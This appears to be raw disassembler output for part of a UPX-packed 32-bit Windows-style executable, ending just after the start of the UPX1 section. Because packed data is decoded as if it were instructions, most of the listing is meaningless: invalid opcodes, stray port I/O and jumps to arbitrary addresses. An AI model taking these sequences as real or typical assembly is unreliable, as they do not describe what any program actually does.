  41791b:	add    BYTE PTR [eax-0x61cfd420],0xec
  417922:	aaa    
  417923:	dec    ebx
  417924:	sbb    ebx,DWORD PTR [ebp+0x45]
  417927:	mov    esp,0xdd7f0942
  41792c:	jb     0x4178ff
  41792e:	add    DWORD PTR [ebp+0x50],ebp
  417931:	fimul  DWORD PTR [edx+0x1285e59a]
  417937:	mov    al,0xb0
  417939:	sbb    edi,DWORD PTR [edx+0x70]
  41793c:	xlat   BYTE PTR ds:[ebx]
  41793d:	fstp   DWORD PTR [ebx+0x6e]
  417940:	ins    DWORD PTR es:[edi],dx
  417941:	sub    DWORD PTR [esi-0x22e7f88],esi
  417947:	ja     0x41799c
  417949:	adc    al,0xe6
  41794b:	xor    DWORD PTR [ebx-0x3b],eax
  41794e:	mov    es,WORD PTR [eax]
  417950:	test   DWORD PTR fs:[ecx+0x15],eax
  417954:	cs ins BYTE PTR es:[edi],dx
  417956:	ins    DWORD PTR es:[edi],dx
  417957:	ins    DWORD PTR es:[edi],dx
  417958:	nop
  417959:	sub    BYTE PTR [ecx],0xfb
  41795c:	dec    edx
  41795d:	xor    al,0xc
  41795f:	jo     0x417915
  417961:	jmp    0xdfd3:0x22aec285
  417968:	popf   
  417969:	in     eax,0xd9
  41796b:	mov    bl,BYTE PTR [eax-0x80]
  41796e:	mov    dh,0xf
  417970:	pop    ecx
  417971:	stos   BYTE PTR es:[edi],al
  417972:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417973:	jns    0x417951
  417975:	sahf   
  417976:	and    ch,BYTE PTR [eax+0x2a]
  417979:	cmp    al,BYTE PTR [ebx+ebx*2-0x20]
  41797d:	jp     0x4179dd
  41797f:	cs ins BYTE PTR es:[edi],dx
  417981:	jne    0x4179c7
  417983:	dec    edi
  417984:	dec    edx
  417985:	and    eax,0x5b1a304
  41798a:	and    dh,BYTE PTR [esi+0x1]
  41798d:	aas    
  41798e:	xor    ebx,DWORD PTR [edx]
  417990:	fmul   QWORD PTR [ebx+0x36]
  417993:	push   ds
  417994:	ret    0x85d3
  417997:	sar    BYTE PTR es:[ebp+0x31],0x84
  41799c:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41799e:	scas   al,BYTE PTR es:[edi]
  41799f:	sub    BYTE PTR [edx-0x43035d73],ah
  4179a5:	js     0x4179a7
  4179a7:	std    
  4179a8:	dec    esi
  4179a9:	clc    
  4179aa:	xor    ebp,DWORD PTR ds:0x79ba374b
  4179b0:	or     ah,cl
  4179b2:	mov    dh,0xf5
  4179b4:	push   esi
  4179b5:	sub    eax,0x36801a01
  4179ba:	push   ecx
  4179bb:	outs   dx,DWORD PTR ds:[esi]
  4179bc:	stos   BYTE PTR es:[edi],al
  4179bd:	mov    ebp,0x745fd589
  4179c2:	push   esp
  4179c3:	or     ch,bl
  4179c5:	fs adc edi,edi
  4179c8:	aas    
  4179c9:	aad    0x4
  4179cb:	ror    DWORD PTR [edx-0x20],1
  4179ce:	cli    
  4179cf:	adc    BYTE PTR [edx-0x44ba4d18],ah
  4179d5:	shr    ecx,0x84
  4179d8:	inc    edi
  4179d9:	xor    BYTE PTR [ecx+0x136a3e62],dl
  4179df:	mov    ch,0x7d
  4179e1:	sub    al,0x49
  4179e3:	lahf   
  4179e4:	aam    0xa9
  4179e6:	jmp    0x4179dd
  4179e8:	cmp    esi,DWORD PTR ds:0x87083b00
  4179ee:	xchg   esi,eax
  4179ef:	nop
  4179f0:	imul   eax,DWORD PTR [esi-0x46],0x11b0ba08
  4179f7:	sahf   
  4179f8:	mov    ebx,0x7c362a73
  4179fd:	or     eax,0x7b376d04
  417a02:	dec    esp
  417a03:	push   ebp
  417a04:	mov    al,0x79
  417a06:	ins    BYTE PTR es:[edi],dx
  417a07:	jl     0x4179b3
  417a09:	fucomp st(2)
  417a0b:	mov    bh,BYTE PTR [ebx]
  417a0d:	nop
  417a0e:	push   edi
  417a0f:	xchg   ecx,eax
  417a10:	scas   eax,DWORD PTR es:[edi]
  417a11:	cli    
  417a12:	mov    dh,0x11
  417a14:	ror    DWORD PTR [edi],0x36
  417a17:	lahf   
  417a18:	ret    0xea95
  417a1b:	outs   dx,DWORD PTR ds:[esi]
  417a1c:	clc    
  417a1d:	mov    edx,0x4ef9d0b4
  417a22:	sbb    DWORD PTR [esi-0x5],ebp
  417a25:	inc    ecx
  417a26:	jno    0x417a01
  417a28:	stos   BYTE PTR es:[edi],al
  417a29:	(bad)  [eax+0x5b]
  417a2c:	pop    edx
  417a2d:	and    ah,BYTE PTR [ebx]
  417a2f:	push   esi
  417a30:	in     eax,0xd1
  417a32:	jns    0x417a16
  417a34:	inc    BYTE PTR [edx-0x55f49fdd]
  417a3a:	stos   BYTE PTR es:[edi],al
  417a3b:	xchg   edi,eax
  417a3c:	add    ebp,0xa37050db
  417a42:	mov    eax,ds:0x58c1fb54
  417a47:	data16 jg 0x4179e2
  417a4a:	fnstsw WORD PTR [edx-0x6af0b91e]
  417a50:	dec    DWORD PTR [ebx+0x27]
  417a53:	xchg   BYTE PTR [esi+ecx*4-0x5e8f493f],dh
  417a5a:	out    dx,eax
  417a5b:	mov    esi,0x508ed8bf
  417a60:	xchg   BYTE PTR [ebp+0x13adb6b7],dh
  417a66:	mov    ebp,0xff8510d
  417a6b:	dec    edi
  417a6c:	(bad)  [ebx]
  417a6e:	or     ecx,DWORD PTR [ebp+0x41]
  417a71:	dec    ebx
  417a72:	push   esi
  417a73:	lea    ebp,[edi]
  417a75:	and    dl,BYTE PTR [esi]
  417a77:	sub    edx,DWORD PTR [ebx+ebx*8+0x6e]
  417a7b:	or     esi,DWORD PTR [ecx]
  417a7d:	pop    ebp
  417a7e:	cmp    ebx,DWORD PTR [edx-0x613fc148]
  417a84:	mov    ah,0xb5
  417a86:	mov    ds,WORD PTR [edx]
  417a88:	jno    0x417a7e
  417a8a:	pop    ds
  417a8b:	jp     0x417a6a
  417a8d:	xor    al,0x6d
  417a8f:	or     esi,DWORD PTR [edi+0x4fce89cd]
  417a95:	pop    ecx
  417a96:	push   esi
  417a97:	adc    BYTE PTR [bp+di+0x76e9],ah
  417a9c:	stos   BYTE PTR es:[edi],al
  417a9d:	lods   eax,DWORD PTR ds:[esi]
  417a9e:	dec    ebp
  417a9f:	add    al,al
  417aa1:	push   ss
  417aa2:	push   0x1b14fe46
  417aa7:	mov    bh,0xba
  417aa9:	mov    ecx,0x9b8f9a6b
  417aae:	xchg   DWORD PTR [ebx-0x73],ebp
  417ab1:	push   es
  417ab2:	bound  eax,QWORD PTR [edi+0x79]
  417ab5:	daa    
  417ab6:	sub    al,bh
  417ab8:	pop    eax
  417ab9:	cmp    DWORD PTR [edi+edx*1-0x26],ebp
  417abd:	(bad)  
  417abe:	jno    0x417ae7
  417ac0:	ror    dl,0x1a
  417ac3:	cmp    eax,0x521d9668
  417ac8:	mov    eax,0x2e054db5
  417acd:	cs cs mov eax,gs:0x1b6eba95
  417ad5:	inc    esp
  417ad6:	mov    cs:0x6bcc7b9,eax
  417adc:	pop    ecx
  417add:	add    BYTE PTR [ebx-0x572e27de],bh
  417ae3:	mov    ebx,0xa8bb5dd3
  417ae8:	mov    dh,0x5d
  417aea:	mov    al,ds:0x6eec7aa5
  417aef:	sub    DWORD PTR [esi+0x1d],edx
  417af2:	rol    DWORD PTR ds:0x89176b71,1
  417af8:	cwde   
  417af9:	arpl   ax,ax
  417afb:	and    BYTE PTR [ecx-0x50],al
  417afe:	mov    eax,ds:0x916ff6ba
  417b03:	outs   dx,BYTE PTR ds:[esi]
  417b04:	push   ds
  417b05:	add    DWORD PTR [eax],eax
  417b07:	mov    eax,0x91da768a
  417b0c:	and    BYTE PTR [esi],bh
  417b0e:	imul   eax,DWORD PTR [eax+0x69],0xffffffbb
  417b12:	test   al,0xca
  417b14:	sbb    al,0x2f
  417b16:	lods   al,BYTE PTR ds:[esi]
  417b17:	push   cs
  417b18:	lea    edi,[ebp+0x63]
  417b1b:	sub    DWORD PTR [eax-0x62482e90],0x529f88e4
  417b25:	imul   ecx,DWORD PTR [ebx],0xffffffd4
  417b28:	pop    di
  417b2a:	xchg   ebp,eax
  417b2b:	jnp    0x417b74
  417b2d:	push   0x14
  417b2f:	sub    eax,0xbfdac180
  417b34:	rcl    DWORD PTR [esi+0x28],0x44
  417b38:	jecxz  0x417b34
  417b3a:	cmp    BYTE PTR [edi-0x50dcff6f],al
  417b40:	ins    BYTE PTR es:[edi],dx
  417b41:	pop    ebp
  417b42:	push   0x49b5c32d
  417b47:	les    ebp,FWORD PTR [ecx]
  417b49:	mov    dl,0xff
  417b4b:	sbb    edx,DWORD PTR [ebp+0xd]
  417b4e:	push   eax
  417b4f:	sub    eax,0x14a60082
  417b54:	outs   dx,BYTE PTR ds:[esi]
  417b55:	or     eax,0x4dae1745
  417b5a:	test   eax,0x6170376a
  417b5f:	sub    eax,DWORD PTR [ecx]
  417b61:	lods   eax,DWORD PTR ds:[esi]
  417b62:	push   0x926219ec
  417b67:	and    al,0xd6
  417b6a:	push   ecx
  417b6b:	mov    ds:0x4518aa1a,al
  417b70:	fidiv  DWORD PTR [edx+0x178d6db1]
  417b76:	jg     0x417baa
  417b78:	cs stc 
  417b7a:	aam    0xb1
  417b7c:	xchg   ebp,eax
  417b7d:	jge    0x417bf3
  417b7f:	arpl   bx,bx
  417b81:	ds xor al,0x14
  417b84:	adc    DWORD PTR es:[ebp-0x4c],0xdb71ed3a
  417b8c:	mov    ds:0xdeb42d04,al
  417b91:	xchg   edx,eax
  417b92:	sbb    bl,ch
  417b94:	loop   0x417bdc
  417b96:	pop    ebx
  417b97:	push   ebx
  417b98:	fadd   QWORD PTR [ecx+esi*2+0x30f05bd3]
  417b9f:	ins    BYTE PTR es:[edi],dx
  417ba0:	fdiv   QWORD PTR [esi+0x35b6148e]
  417ba6:	add    ecx,DWORD PTR [eax]
  417ba8:	sbb    eax,0xb819e157
  417bad:	mov    ch,0x4d
  417baf:	inc    esp
  417bb0:	daa    
  417bb1:	mov    cl,0x58
  417bb3:	stos   BYTE PTR es:[edi],al
  417bb4:	add    eax,0xdd012ad5
  417bb9:	push   0xb78b340a
  417bbe:	mov    dl,ch
  417bc0:	mov    dh,0x1
  417bc2:	outs   dx,BYTE PTR ds:[esi]
  417bc3:	pop    ebp
  417bc4:	pop    es
  417bc5:	jecxz  0x417c3b
  417bc7:	mov    eax,0xd8c016ed
  417bcc:	sti    
  417bcd:	mov    gs,WORD PTR [edx]
  417bcf:	xchg   esi,eax
  417bd0:	stos   BYTE PTR es:[edi],al
  417bd1:	add    edx,ebp
  417bd3:	mov    bl,0xb6
  417bd5:	adc    BYTE PTR [ebp-0xbd80580],dh
  417bdb:	test   DWORD PTR [ebx],ecx
  417bdd:	mov    ch,0xed
  417bdf:	repnz lea ebx,[ecx-0x39ffe57b]
  417be6:	xchg   esi,eax
  417be7:	mov    dh,0x2
  417be9:	mov    eax,0xa3400d50
  417bee:	mov    al,0xfb
  417bf0:	cmp    BYTE PTR [ebx+0x367303df],0xba
  417bf7:	test   al,0xad
  417bf9:	cld    
  417bfa:	cmp    eax,0x93d46089
  417bff:	int    0xb6
  417c01:	lea    ebp,[ebp-0x25]
  417c04:	mov    eax,ds:0xad350e61
  417c09:	dec    ebp
  417c0a:	shl    BYTE PTR [edi+0x35],cl
  417c0d:	sbb    BYTE PTR [ebx],ch
  417c0f:	push   eax
  417c10:	mov    ah,0x2a
  417c12:	add    BYTE PTR [edi+0x4a],bh
  417c15:	sub    BYTE PTR [ebp-0x4c879255],0x72
  417c1c:	and    ecx,DWORD PTR ds:0x44d82d4d
  417c22:	aaa    
  417c23:	call   0xa8bd:0x3260dc2d
  417c2a:	mov    cl,0x40
  417c2c:	inc    esi
  417c2d:	inc    edi
  417c2e:	in     eax,dx
  417c2f:	mov    ah,BYTE PTR [ecx-0x22363647]
  417c35:	lahf   
  417c36:	stos   BYTE PTR es:[edi],al
  417c37:	dec    ebx
  417c38:	pop    ebx
  417c39:	fisttp DWORD PTR [eax]
  417c3b:	pop    ss
  417c3c:	es mov ch,0xc
  417c3f:	jno    0x417ca7
  417c41:	test   al,0xad
  417c43:	ins    DWORD PTR es:[edi],dx
  417c44:	xchg   edi,eax
  417c45:	cmp    cl,BYTE PTR ds:0x8f1ecb25
  417c4b:	mov    ecx,0x1a5cec64
  417c50:	call   0xdc33514b
  417c55:	mov    ebp,0xb0480b98
  417c5a:	jecxz  0x417c42
  417c5c:	push   edi
  417c5d:	fst    QWORD PTR [esi-0x4c27c24a]
  417c63:	mov    DWORD PTR [esi],edi
  417c65:	jmp    0x417c10
  417c67:	cli    
  417c68:	add    ch,ch
  417c6a:	mov    BYTE PTR [esi+0x6f],0xab
  417c6e:	xchg   edi,eax
  417c6f:	jnp    0x417cc4
  417c71:	cmp    al,0xef
  417c73:	dec    ebp
  417c74:	shr    DWORD PTR [ebp-0x5d],1
  417c77:	xchg   ecx,eax
  417c78:	push   ds
  417c79:	push   ecx
  417c7a:	and    ebx,ecx
  417c7c:	hlt    
  417c7d:	and    BYTE PTR [esi-0x58],dl
  417c80:	ret    0x4be5
  417c83:	xlat   BYTE PTR ds:[ebx]
  417c84:	inc    eax
  417c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c86:	add    ah,ch
  417c88:	pop    ss
  417c89:	mov    gs:0xd8821b1a,eax
  417c8f:	xor    esi,DWORD PTR [edx]
  417c91:	iret   
  417c92:	fst    QWORD PTR ds:0x37cb02db
  417c98:	push   ss
  417c99:	fcomip st,st(7)
  417c9b:	seto   BYTE PTR [edi]
  417c9e:	add    bh,bh
  417ca0:	ds aas 
  417ca2:	fcmovnb st,st(6)
  417ca4:	ret    0xd2c6
  417ca7:	adc    dl,BYTE PTR [eax]
  417ca9:	aaa    
  417caa:	push   ebp
  417cab:	outs   dx,DWORD PTR ds:[esi]
  417cac:	std    
  417cad:	lods   eax,DWORD PTR ds:[esi]
  417cae:	mov    ebp,edx
  417cb0:	mov    al,ds:0x860d46e0
  417cb5:	or     eax,0xb1b54229
  417cba:	push   ebp
  417cbb:	pusha  
  417cbc:	aam    0x82
  417cbe:	sahf   
  417cbf:	aas    
  417cc0:	add    al,0xb5
  417cc2:	ins    DWORD PTR es:[edi],dx
  417cc3:	xor    al,0x11
  417cc5:	sti    
  417cc6:	repz push ecx
  417cc8:	push   esp
  417cc9:	das    
  417cca:	lea    ebp,[eax-0x4f925ea]
  417cd0:	out    dx,al
  417cd1:	and    ecx,DWORD PTR [edi-0x26]
  417cd4:	mov    dh,0xb6
  417cd6:	or     ebx,eax
  417cd8:	mov    ebx,0xc25293bc
  417cdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cde:	jge    0x417cb2
  417ce0:	aam    0x40
  417ce2:	pop    ss
  417ce3:	push   ss
  417ce4:	mov    ds:0x2b0b9480,eax
  417ce9:	jmp    0x860cc15f
  417cee:	add    ch,BYTE PTR [edi]
  417cf0:	cmp    eax,0xa0b8dce0
  417cf5:	pop    es
  417cf6:	mov    dh,0x1d
  417cf8:	mov    bl,0x50
  417cfa:	das    
  417cfb:	push   cs
  417cfc:	test   BYTE PTR [ebp+eiz*4-0x46],dl
  417d00:	mov    ds:0x3561856e,al
  417d05:	pop    edi
  417d06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d07:	pop    ebp
  417d08:	mov    bh,0x80
  417d0a:	lea    ebp,[ebp-0x25]
  417d0d:	into   
  417d0e:	sub    DWORD PTR [esi+0xf7e26f6],eax
  417d14:	sbb    eax,0x5510b455
  417d19:	mov    ebx,0x1b114978
  417d1e:	add    dl,bl
  417d20:	or     BYTE PTR [edi],al
  417d22:	sbb    DWORD PTR [edx],0xffffff83
  417d25:	inc    BYTE PTR [eax]
  417d27:	xchg   esi,eax
  417d28:	aaa    
  417d29:	sbb    dh,BYTE PTR [edi+edx*2]
  417d2c:	verw   WORD PTR [edi]
  417d2f:	dec    esp
  417d30:	in     eax,dx
  417d31:	cmp    BYTE PTR [eax+0x28ffddd1],0x76
  417d38:	iret   
  417d39:	inc    ecx
  417d3a:	xchg   edi,eax
  417d3b:	in     eax,dx
  417d3c:	sbb    al,0x1
  417d3f:	mov    gs,WORD PTR ds:0x64bcb648
  417d45:	shr    BYTE PTR ss:[ebp-0x5d],0x29
  417d4a:	add    ebx,esp
  417d4c:	mov    esp,0x72c4fc40
  417d51:	or     al,0xb6
  417d53:	pop    ebx
  417d54:	mov    ebx,0xd3aa55b5
  417d59:	jo     0x417d20
  417d5b:	ja     0x417d8e
  417d5d:	(bad)  
  417d5e:	pop    edi
  417d5f:	jbe    0x417dce
  417d61:	sub    DWORD PTR [eax+0x22],0x3b
  417d65:	push   ebx
  417d66:	push   esp
  417d67:	test   eax,0x856e8211
  417d6c:	or     eax,DWORD PTR [ebx+esi*4]
  417d6f:	dec    esp
  417d70:	xchg   esp,eax
  417d71:	xor    eax,0x6d0b080e
  417d76:	or     ebp,DWORD PTR [eax-0x2e]
  417d79:	retf   0x3f1e
  417d7c:	inc    esp
  417d7d:	or     eax,0xdc40165
  417d82:	pop    es
  417d83:	(bad)  
  417d84:	pushf  
  417d85:	fldcw  WORD PTR [edi-0x2924f47e]
  417d8b:	imul   ecx,DWORD PTR [ecx],0xbacbf486
  417d91:	and    BYTE PTR [ecx],0xbf
  417d94:	outs   dx,BYTE PTR ds:[esi]
  417d95:	ins    BYTE PTR es:[edi],dx
  417d96:	(bad)  [ecx]
  417d98:	pop    esi
  417d99:	(bad)  
  417d9b:	mov    bl,0x88
  417d9d:	jle    0x417d68
  417d9f:	add    BYTE PTR ss:[edi],dh
  417da2:	sbb    cl,BYTE PTR [edx-0x6c12ded7]
  417da8:	push   ebx
  417da9:	push   ebp
  417daa:	dec    ebx
  417dab:	or     eax,0x6b4cee13
  417db0:	jnp    0x417dec
  417db2:	add    dh,BYTE PTR [esi-0x1b6afab3]
  417db8:	sbb    eax,0xedd392c5
  417dbd:	ret    0x8342
  417dc0:	add    al,0xaf
  417dc2:	inc    ebx
  417dc3:	jl     0x417df3
  417dc5:	imul   BYTE PTR [ebx+0x6e]
  417dc8:	dec    edi
  417dc9:	pop    ebx
  417dca:	add    ebp,edx
  417dcc:	mov    al,ds:0x1f4da9a4
  417dd1:	and    al,0xad
  417dd3:	mov    gs,WORD PTR [edx]
  417dd5:	xchg   esi,eax
  417dd6:	jp     0x417da7
  417dd8:	ffree  st(4)
  417dda:	scas   eax,DWORD PTR es:[edi]
  417ddb:	xchg   BYTE PTR [edx-0x62c02482],ah
  417de1:	in     al,dx
  417de2:	ficom  WORD PTR [ecx]
  417de4:	pop    edx
  417de5:	jmp    0x417dd7
  417de7:	fadd   DWORD PTR [eax+0x74]
  417dea:	mov    DWORD PTR [eax-0x380f293],ebp
  417df0:	sub    eax,DWORD PTR [esi]
  417df2:	jbe    0x417e5f
  417df4:	mov    bh,0xae
  417df6:	leave  
  417df7:	sbb    al,0x83
  417df9:	mov    al,0x1b
  417dfb:	mov    al,0x5c
  417dfd:	jl     0x417e21
  417dff:	xchg   ebp,eax
  417e00:	in     eax,dx
  417e01:	push   esi
  417e02:	stos   BYTE PTR es:[edi],al
  417e03:	lods   eax,DWORD PTR ds:[esi]
  417e04:	jmp    0x417d97
  417e06:	and    ebp,DWORD PTR [esi-0x73]
  417e09:	(bad)  
  417e0a:	jecxz  0x417e16
  417e0c:	mov    edx,0xcdc5b6d
  417e11:	mov    dh,0xee
  417e13:	ret    0x5afd
  417e16:	inc    esp
  417e17:	pop    esp
  417e18:	fsubr  DWORD PTR [edx+0x32]
  417e1b:	daa    
  417e1c:	xchg   edi,eax
  417e1d:	mov    ch,0x31
  417e1f:	push   edx
  417e20:	mov    ch,BYTE PTR [ebp-0xa2e457d]
  417e26:	mov    cl,0x87
  417e28:	add    DWORD PTR [ebx-0x5a76e98c],esi
  417e2e:	sbb    eax,DWORD PTR ds:0xdb8bf580
  417e34:	popf   
  417e35:	push   ds
  417e36:	cmp    edi,ebx
  417e38:	aam    0x42
  417e3a:	mov    ch,0x62
  417e3c:	and    BYTE PTR [ebx+0x1026db3d],bh
  417e42:	inc    edi
  417e43:	mov    ch,0x89
  417e45:	mov    al,ds:0xbf0a985b
  417e4a:	add    DWORD PTR [edi+0x60026bee],edx
  417e50:	inc    edi
  417e51:	hlt    
  417e52:	push   0x4d036dbc
  417e57:	test   DWORD PTR [ebp+0x3],ebp
  417e5a:	jno    0x417e7e
  417e5c:	add    dh,cl
  417e5e:	jg     0x417e22
  417e60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e61:	inc    esi
  417e62:	inc    ebx
  417e63:	mov    dh,0xa1
  417e65:	or     BYTE PTR [ebp+0x27fd7223],0x4c
  417e6c:	(bad)  
  417e6d:	xor    eax,0xc45342d6
  417e72:	ja     0x417ee3
  417e74:	pop    ss
  417e75:	mov    esi,0x6e15c7cf
  417e7a:	ins    BYTE PTR es:[edi],dx
  417e7b:	(bad)  [edx-0xa6cf62]
  417e81:	in     al,0x18
  417e83:	xchg   ebp,eax
  417e84:	add    DWORD PTR [ecx+0x63],esp
  417e87:	add    DWORD PTR [edx],0x4a
  417e8a:	mov    DWORD PTR [ebx],edi
  417e8c:	or     al,0x8a
  417e8e:	dec    ecx
  417e8f:	xor    al,0x76
  417e91:	shl    DWORD PTR [esi+0x53],1
  417e94:	out    dx,eax
  417e95:	xor    eax,0x4f4f955b
  417e9a:	xchg   ebx,eax
  417e9b:	sub    edx,0x61a62cb6
  417ea1:	dec    eax
  417ea2:	outs   dx,BYTE PTR ds:[esi]
  417ea3:	inc    esp
  417ea4:	or     BYTE PTR [ecx-0x4eff2913],0x6
  417eab:	mov    ch,0xea
  417ead:	repnz retf 
  417eaf:	loop   0x417ef9
  417eb1:	mov    DWORD PTR [ebp-0x39e4e925],esp
  417eb7:	shl    DWORD PTR [ecx-0x1adb437f],1
  417ebd:	into   
  417ebe:	mov    ebx,0x99b6146d
  417ec3:	jecxz  0x417e61
  417ec5:	jg     0x417e57
  417ec7:	scas   eax,DWORD PTR es:[edi]
  417ec8:	pop    DWORD PTR [edi-0x13d5cabe]
  417ece:	and    BYTE PTR [edx+0x4c],0xa1
  417ed2:	jb     0x417e64
  417ed4:	mov    ch,0x6d
  417ed6:	jne    0x417f1d
  417ed8:	pop    esp
  417ed9:	xchg   ebp,eax
  417eda:	mov    ebx,0x2e05aa50
  417edf:	ja     0x417f4e
  417ee1:	jmp    0x417e63
  417ee3:	mov    edx,0xed9fe392
  417ee8:	fcomp  DWORD PTR ds:0x6a810e2e
  417eee:	inc    ebx
  417eef:	aad    0x37
  417ef1:	ja     0x417ea2
  417ef3:	sbb    edi,DWORD PTR [eax+0x216d0b4a]
  417ef9:	test   al,0x24
  417efb:	fnstcw WORD PTR [eax-0x5c]
  417efe:	inc    eax
  417eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f00:	mov    dh,0xca
  417f02:	mov    bh,0x85
  417f04:	cmp    BYTE PTR [eax],dl
  417f06:	ja     0x417f5e
  417f08:	mov    eax,ds:0x46607e00
  417f0d:	cmp    eax,0xdc50da83
  417f12:	je     0x417f45
  417f14:	call   0x3bff2f22
  417f19:	xor    BYTE PTR [esi+0x69],0xa1
  417f1d:	push   0xffffff8b
  417f1f:	jo     0x417eec
  417f21:	push   esi
  417f22:	stos   BYTE PTR es:[edi],al
  417f23:	inc    ecx
  417f24:	fld    TBYTE PTR [esi+0x2ac4968a]
  417f2a:	lods   al,BYTE PTR ds:[esi]
  417f2b:	out    dx,al
  417f2c:	loop   0x417ebd
  417f2e:	cwde   
  417f2f:	repnz test DWORD PTR [ebx],ecx
  417f32:	pcmpeqd mm7,mm1
  417f35:	xor    DWORD PTR [esi+0x47fd1e],edx
  417f3b:	push   ss
  417f3c:	aam    0x85
  417f3e:	lea    ecx,[ebp-0x9a3345b]
  417f44:	jmp    0x417ec7
  417f46:	mov    edi,0x746c69a
  417f4b:	aam    0x63
  417f4d:	cmp    eax,0x3e4e667e
  417f52:	cdq    
  417f53:	mov    ebx,0x8dc6edb5
  417f58:	adc    ah,BYTE PTR [eax-0x10]
  417f5b:	cmp    edx,DWORD PTR [edx+0x4a]
  417f5e:	add    bl,BYTE PTR [ebx+esi*2+0x2e00ad4]
  417f65:	pop    ebx
  417f66:	inc    ecx
  417f67:	pop    ecx
  417f68:	test   BYTE PTR [esi+ecx*8+0x6aaadb6d],ah
  417f6f:	jne    0x417fed
  417f71:	mov    al,ds:0xce880867
  417f76:	aam    0xad
  417f78:	mov    ds:0xa138d82,eax
  417f7d:	jge    0x417f58
  417f7f:	ins    DWORD PTR es:[edi],dx
  417f80:	in     eax,dx
  417f81:	(bad)  
  417f82:	(bad)  
  417f83:	adc    DWORD PTR [ebx+0x79],esi
  417f86:	je     0x417f32
  417f88:	fcmovnb st,st(5)
  417f8a:	clc    
  417f8b:	mov    WORD PTR [esi],?
  417f8d:	outs   dx,BYTE PTR ds:[esi]
  417f8e:	mov    ah,0x6e
  417f90:	aam    0x12
  417f92:	repz dec esp
  417f94:	cmp    al,0x3b
  417f96:	add    DWORD PTR [edi-0x47ff446a],esi
  417f9c:	xor    eax,0x2e214ade
  417fa1:	or     DWORD PTR [ebx+0x8],esp
  417fa4:	lods   eax,DWORD PTR ds:[esi]
  417fa5:	sub    eax,0xc78dd57
  417fab:	jnp    0x417f5f
  417fad:	jmp    0xdb928d3a
  417fb2:	outs   dx,BYTE PTR ds:[esi]
  417fb3:	xor    ah,dh
  417fb5:	xchg   BYTE PTR [eax],al
  417fb7:	mov    eax,ds:0xab75102e
  417fbc:	test   eax,0x7dfdadec
  417fc1:	ins    BYTE PTR es:[edi],dx
  417fc2:	add    eax,0xaeda29a0
  417fc7:	adc    ecx,ecx
  417fc9:	in     al,dx
  417fca:	fdiv   QWORD PTR [esi]
  417fcc:	add    esp,DWORD PTR [eax-0x7d1af4a5]
  417fd2:	popa   
  417fd3:	jnp    0x418049
  417fd5:	mov    ch,0xa
  417fd7:	mov    bh,0x76
  417fd9:	test   eax,0x6372fb4d
  417fde:	xchg   ebp,eax
  417fdf:	sub    DWORD PTR [ebx+0x68],esp
  417fe2:	mov    esi,0xd5ba2
  417fe7:	dec    ebp
  417fe8:	xchg   ecx,eax
  417fe9:	jae    0x417fd4
  417feb:	inc    esi
  417fec:	mov    eax,ds:0x809a29a8
  417ff1:	mov    DWORD PTR [eax],esi
  417ff3:	pop    es
  417ff4:	cs ins DWORD PTR es:[edi],dx
  417ff6:	frstpm(287 only) 
  417ff8:	add    eax,0xe0a0238d
  417ffd:	.byte 0x5
  417ffe:	data16
  417fff:	.byte 0xb7

Disassembly of section UPX1:

00418000 <UPX1>:
  418000:	dec    eax
  418001:	call   DWORD PTR cs:[edi+0x60a0400]
  418008:	push   ebx
  418009:	je     0x41807d
  41800b:	imul   ebp,DWORD PTR [esi+0x67],0xa6005800
  418012:	cmp    ecx,ecx
  418014:	xchg   esi,eax
  418015:	pop    ds
  418016:	add    al,0x24
  418018:	add    esi,DWORD PTR fs:[eax-0x33]
  41801c:	jbe    0x418087
  41801e:	call   0x1be4:0x216c7874
  418025:	and    ah,BYTE PTR [edx]
  418027:	mov    al,0x25
  418029:	mov    ebx,0x54073cff
  41802e:	dec    edi
  41802f:	bound  ebp,QWORD PTR [edx+0x65]
  418032:	arpl   WORD PTR [esp+ecx*1+0x64],si
  418036:	pop    es
  418037:	pusha  
  418038:	das    
  418039:	(bad)  
  41803a:	sti    
  41803b:	(bad)  [ecx+0x79]
  41803e:	jae    0x4180b4
  418040:	gs ins DWORD PTR es:[edi],dx
  418042:	add    BYTE PTR ds:0x490a0f84,cl
  418048:	dec    ecx
  418049:	outs   dx,BYTE PTR ds:[esi]
  41804a:	jb     0x4180b2
  41804c:	popa   
  41804d:	fcomp  st(1)
  41804f:	popa   
  418050:	fbld   TBYTE PTR [ebx+0x65]
  418053:	adc    BYTE PTR [ecx],al
  418055:	(bad)  
  418056:	rol    BYTE PTR [esi],0x46
  418059:	sub    eax,0x3ffdbb0f
  41805e:	add    eax,DWORD PTR [eax]
  418060:	(bad)  
  418061:	dec    esp
  418063:	add    DWORD PTR [esp+0x4],0xfffffff8
  418068:	jmp    0xa3dc28f
  41806d:	inc    ebx
  41806e:	and    al,0x74
  418070:	pop    ebp
  418071:	mul    DWORD PTR [eax+edi*1]
  418074:	int3   
  418075:	int3   
  418076:	das    
  418077:	mov    cl,0x3
  418079:	mov    ebx,0xdb07c548
  41807e:	(bad)  
  41807f:	in     al,dx
  418080:	dec    ebx
  418081:	add    edx,ecx
  418083:	or     BYTE PTR [ebx],dl
  418085:	lea    eax,[eax-0xe]
  418088:	adc    eax,0x4c6d7dd2
  41808d:	repz fld QWORD PTR [ecx]
  418090:	dec    esp
  418091:	or     al,0xbc
  418093:	lods   al,BYTE PTR ds:[esi]
  418094:	jnp    0x418108
  418096:	or     al,0x42
  418098:	aam    0x3
  41809a:	loopne 0x41808f
  41809c:	inc    edx
  41809d:	lock std 
  41809f:	ins    BYTE PTR es:[edi],dx
  4180a0:	mov    dl,0x87
  4180a2:	adc    DWORD PTR [esi+eax*8+0x64],edx
  4180a6:	lock mov eax,eax
  4180a9:	jmp    DWORD PTR ds:0xbb064190
  4180af:	inc    eax
  4180b0:	popa   
  4180b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180b2:	pop    es
  4180b3:	mov    al,ds:0x1906419c
  4180b8:	fs cwde 
  4180ba:	xchg   esp,eax
  4180bb:	mov    eax,0x90641906
  4180c0:	nop
  4180c1:	mov    ah,0x8c
  4180c3:	mov    BYTE PTR [ecx],bl
  4180c5:	fs nop
  4180c7:	inc    ecx
